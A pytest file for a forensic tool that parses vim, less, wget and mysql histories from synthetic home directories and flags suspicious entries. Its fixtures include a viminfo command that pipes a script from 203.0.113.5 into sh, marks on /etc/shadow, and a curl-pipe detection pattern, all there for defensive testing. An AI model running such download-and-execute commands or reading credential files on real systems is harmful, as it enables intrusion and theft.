"""v0.7.137: app_history.csv -- vim, less, wget and REPL/database-client
histories. Synthetic home directories; users, paths and hosts are invented."""
from __future__ import annotations

import csv
from pathlib import Path
from types import SimpleNamespace

from artifact_engine.handlers import lin_app_history

VIMINFO = """\
# This viminfo file was generated by Vim 9.0.
# Command Line History (newest to oldest):
:!curl http://203.0.113.5/x.sh | sh
|2,0,1700000300,,"!curl http://203.0.113.5/x.sh | sh"
:wq
|2,0,1700000200,,"wq"

# Search String History (newest to oldest):
?/password
|2,1,1700000100,47,"password"

# File marks:
'0  10  0  /etc/shadow
|4,48,10,0,1700000400,"/etc/shadow"
'1  3  0  /var/log/auth.log
|4,49,3,0,1700000350,"/var/log/auth.log"

# Jumplist (newest first):
-'  10  0  /etc/shadow
|4,39,10,0,1700000500,"/etc/shadow"

# History of marks within files (newest to oldest):

> /home/jdoe/notes.txt
\t*\t1700000050\t0
\t"\t1\t0
"""
OLD_VIMINFO = """\
# Command Line History (newest to oldest):
:set nu
# File marks:
'0  1  0  /home/jdoe/old.txt
"""
LESSHST = """\
.less-history-file:
.search
"error
.shell
"rm -f /tmp/x
"""
HSTS = """\
# HSTS 1.0 Known Hosts database for GNU Wget.
example.org\t0\t1\t1700000600\t31536000
files.example.net\t8443\t0\t1700000700\t31536000
"""
MYSQL = "_HiStOrY_V2_\nselect\\040*\\040from\\040users;\n"


def _home(tmp_path: Path, files: dict[str, str]) -> Path:
    home = tmp_path / "ev" / "[root]" / "home" / "jdoe"
    home.mkdir(parents=True)
    for name, text in files.items():
        (home / name).write_text(text, encoding="utf-8")
    return tmp_path / "ev"


def _rows(tmp_path: Path, files: dict[str, str], tools: str = "") -> list[dict]:
    ev = _home(tmp_path, files)
    assets = tmp_path / "assets"
    assets.mkdir()
    if tools:
        (assets / "suspicious_tools.txt").write_text(tools, encoding="utf-8")
    lin_app_history.run(SimpleNamespace(evidence=ev, out=tmp_path / "out", assets=assets))
    with open(tmp_path / "out" / "app_history.csv", encoding="utf-8", newline="") as fh:
        return list(csv.DictReader(fh))


def test_vim_commands_searches_and_files_with_their_times(tmp_path):
    rows = _rows(tmp_path, {".viminfo": VIMINFO})
    got = {(r["kind"], r["value"]): r["time_utc"] for r in rows}
    assert got[("command", "!curl http://203.0.113.5/x.sh | sh")] == "2023-11-14 22:18:20"
    assert got[("search", "password")] == "2023-11-14 22:15:00"
    assert got[("file", "/home/jdoe/notes.txt")] == "2023-11-14 22:14:10"
    # marks and jumplist name /etc/shadow twice: one row, the newest time
    assert [r for r in rows if r["value"] == "/etc/shadow"][0]["time_utc"] == "2023-11-14 22:21:40"
    assert sum(r["value"] == "/etc/shadow" for r in rows) == 1


def test_an_old_viminfo_without_times_still_reads(tmp_path):
    rows = _rows(tmp_path, {".viminfo": OLD_VIMINFO})
    assert [(r["kind"], r["value"], r["time_utc"]) for r in rows] == [
        ("command", "set nu", ""), ("file", "/home/jdoe/old.txt", "")]


def test_files_opened_in_vim_are_flagged_by_what_they_are(tmp_path):
    rows = {r["value"]: r["flag"] for r in _rows(tmp_path, {".viminfo": VIMINFO})}
    assert rows["/etc/shadow"] == "sensitive_file"
    assert rows["/var/log/auth.log"] == "log_edit"
    assert rows["/home/jdoe/notes.txt"] == ""


def test_named_tools_are_flagged_in_commands(tmp_path):
    rows = _rows(tmp_path, {".viminfo": VIMINFO}, tools="curl-pipe = curl .*\\| *sh\n")
    assert [(r["kind"], r["flag"]) for r in rows if r["flag"] and r["kind"] != "file"] == [
        ("command", "curl-pipe")]


def test_less_searches_and_shell_commands(tmp_path):
    rows = _rows(tmp_path, {".lesshst": LESSHST})
    assert [(r["tool"], r["kind"], r["value"]) for r in rows] == [
        ("less", "search", "error"), ("less", "command", "rm -f /tmp/x")]


def test_wget_hosts_with_their_first_time(tmp_path):
    rows = _rows(tmp_path, {".wget-hsts": HSTS})
    assert [(r["value"], r["time_utc"]) for r in rows] == [
        ("example.org", "2023-11-14 22:23:20"), ("files.example.net:8443", "2023-11-14 22:25:00")]


def test_a_database_client_history_is_unescaped(tmp_path):
    rows = _rows(tmp_path, {".mysql_history": MYSQL})
    assert [(r["tool"], r["kind"], r["value"]) for r in rows] == [
        ("mysql", "query", "select * from users;")]


def test_rows_are_numbered_per_user(tmp_path):
    rows = _rows(tmp_path, {".viminfo": OLD_VIMINFO, ".mysql_history": MYSQL})
    assert [r["id"] for r in rows] == ["1", "2", "3"]
    assert {r["user"] for r in rows} == {"jdoe"}
